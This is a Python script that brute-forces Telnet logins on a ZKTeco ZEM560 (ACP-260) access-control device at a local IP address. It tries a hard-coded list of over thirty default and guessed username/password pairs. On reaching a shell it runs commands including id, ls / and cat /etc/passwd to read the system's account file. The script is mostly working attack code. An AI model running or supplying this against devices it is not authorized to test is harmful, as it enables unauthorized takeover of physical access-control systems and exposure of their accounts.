"""
ZKTeco ZEM560 Telnet login — fixed response handling.
Dumps every raw byte so we can see exactly what the device sends back.

Target: ACP-260 (ZEM560) at 192.168.1.201:23
"""

import socket
import time

DEVICE_IP = "192.168.1.201"
TIMEOUT = 3

# Known ZKTeco/ZEM default credentials
CREDENTIALS = [
    ("root", "sola"),
    ("root", "root"),
    ("root", "zksoftware"),
    ("root", "zktco"),
    ("root", "ZKTeco"),
    ("root", "zk123"),
    ("root", "zktest"),
    ("root", "admin"),
    ("root", "123456"),
    ("root", "12345"),
    ("root", ""),
    ("admin", "admin"),
    ("admin", "123456"),
    ("admin", "zksoftware"),
    ("admin", "zktco"),
    ("admin", "ZKTeco"),
    ("admin", "sola"),
    ("admin", "12345"),
    ("guest", "guest"),
    ("zk", "zk"),
    ("manager", "manager"),
    ("root", "mips"),
    ("root", "zem500"),
    ("root", "zem560"),
    ("root", "treckle"),
    ("root", "ZEM560"),
    ("root", "acp260"),
    ("root", "ACP260"),
    # ZKAccess defaults
    ("Administrator", ""),
    ("admin", ""),
    ("operator", "operator"),
    ("super", "super"),
    ("supervisor", "supervisor"),
]


def recv_all(sock, timeout=2):
    """Read everything available from socket."""
    data = b""
    sock.settimeout(timeout)
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
        except socket.timeout:
            break
        except Exception:
            break
    return data


def try_login(username, password):
    """Try one set of credentials."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(TIMEOUT)

    try:
        sock.connect((DEVICE_IP, 23))

        # Read banner
        banner = recv_all(sock, timeout=2)
        banner_text = banner.decode('ascii', errors='replace')
        print(f"    Banner: {banner_text.strip()[:120]}")

        # Send username
        sock.send(f"{username}\r\n".encode())
        resp1 = recv_all(sock, timeout=1)
        resp1_text = resp1.decode('ascii', errors='replace')
        print(f"    After user: {repr(resp1_text.strip()[:120])}")

        # Send password
        sock.send(f"{password}\r\n".encode())
        time.sleep(1.5)
        resp2 = recv_all(sock, timeout=2)
        resp2_text = resp2.decode('ascii', errors='replace')
        print(f"    After pass: {repr(resp2_text.strip()[:200])}")

        # Check result
        if "Login incorrect" in resp2_text:
            sock.close()
            return False, "Login incorrect"

        if "incorrect" in resp2_text.lower():
            sock.close()
            return False, "Incorrect"

        if "$" in resp2_text or "# " in resp2_text or "~ " in resp2_text:
            print(f"\n    *** SHELL PROMPT DETECTED ***")
            # Try commands
            sock.send(b"echo LOGGED_IN_OK\r\n")
            time.sleep(0.5)
            out = recv_all(sock, timeout=1)
            print(f"    echo test: {out.decode('ascii', errors='replace').strip()}")

            sock.send(b"id\r\n")
            time.sleep(0.5)
            out = recv_all(sock, timeout=1)
            print(f"    id: {out.decode('ascii', errors='replace').strip()}")

            sock.send(b"ls /\r\n")
            time.sleep(0.5)
            out = recv_all(sock, timeout=1)
            print(f"    ls /: {out.decode('ascii', errors='replace').strip()}")

            sock.send(b"cat /etc/passwd\r\n")
            time.sleep(0.5)
            out = recv_all(sock, timeout=1)
            print(f"    passwd: {out.decode('ascii', errors='replace').strip()}")

            sock.close()
            return True, resp2_text

        # If we see "login:" again without "incorrect", password might be wrong
        if "login:" in resp2_text.lower():
            sock.close()
            return False, "Back to login prompt"

        # Truly unknown — dump it raw
        print(f"    RAW HEX: {resp2.hex()}")
        sock.close()
        return False, f"Unknown response"

    except Exception as e:
        try:
            sock.close()
        except:
            pass
        return False, f"Error: {e}"


print("=" * 60)
print(f"ZKTeco ZEM560 LOGIN — {DEVICE_IP}:23")
print(f"Trying {len(CREDENTIALS)} credential combinations")
print("=" * 60)

for username, password in CREDENTIALS:
    pw_display = password if password else "(empty)"
    print(f"\n--- {username} / {pw_display} ---")

    success, detail = try_login(username, password)

    if success:
        print(f"\n{'=' * 60}")
        print(f"  CREDENTIALS FOUND: {username} / {pw_display}")
        print(f"{'=' * 60}")
        break
    else:
        print(f"  Result: {detail}")

    time.sleep(0.5)

print("\nDone.")
